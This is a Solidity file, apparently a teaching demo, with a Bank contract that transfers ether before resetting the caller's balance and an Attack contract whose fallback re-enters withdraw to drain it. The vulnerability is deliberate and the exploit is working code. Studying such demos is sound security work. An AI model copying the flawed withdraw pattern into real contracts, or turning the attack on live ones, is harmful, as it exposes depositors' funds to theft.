// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;


contract Bank {
    mapping (address => uint256) public balanceOf;    // 余额mapping

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提取msg.sender的全部ether
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // 获取余额
        require(balance > 0, "Insufficient balance");
        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // 更新余额
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Bank public bank;


    constructor(Bank _bank) {
        bank = _bank;
    }
    // 重入攻击
    fallback() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }
    
    //存款
    function doDeposit() external payable {
        bank.deposit{value: 1 ether}();
    }

    // 取款发送
    function doWithdraw() external {
        bank.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

}    